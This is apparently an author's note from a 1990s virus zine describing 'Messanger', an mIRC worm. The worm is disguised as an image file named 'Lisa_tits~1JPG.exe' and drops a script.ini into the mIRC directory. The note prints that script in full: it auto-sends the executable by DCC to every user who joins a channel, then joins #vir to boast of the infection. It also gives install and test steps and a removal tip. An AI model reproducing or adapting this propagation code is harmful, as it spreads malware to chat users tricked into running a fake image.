   Yes, this is what happens when I can't sleep
   but dont want to do any REAL coding.

   Info:
   Messanger is sent as a file called "Lisa_tits~1JPG.exe" when this
   file is run the program displays a bit of Pr0n and drops a script.ini
   file into the c:\mirc directory. The lastest version of mIRC (5.51) will use
   this script.ini on the next starting of the program. The script itself assumes
   that:

   1)Lisa_tits~1JPG.exe is in the default download mirc directory
    (c:\mirc\download)
   2)That mirc is installed in its default path. May not work with some earlier
   versions of mirc (some earlier versions of mirc will auto rename script.ini to
   script.old, but this seems not to be the case anymore).

   The script added is:
   [script]
   n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\
      Lisa_Tits~1JPG.exe }
   n1=on 1:CONNECT: {
   n2=  /join #vir
   n3=  /msg #vir Greets to Opic & the CodeBreakers! Meet another 'Messanger'
        infected user!

   To test:
   1)Have or install mIRC v5.51
   2)Place Lisa_tits~1JPG.exe (Messanger) in c:\mirc\download directory and
     execute it.
   3)This will install the script.ini file in c:\mirc
   4)Run mIRC and watch those pr0n lovers gobble jump for joy!

   Disinfection:
   simply delete script.ini (ie: its safe as all hell to test, and fun at least
   to check out the pr0n).

   NOTE: all the files needed to make messanger have been put into one txt file
   here for the zine, to compile them just cut and paste them into thier own
   files (duh).
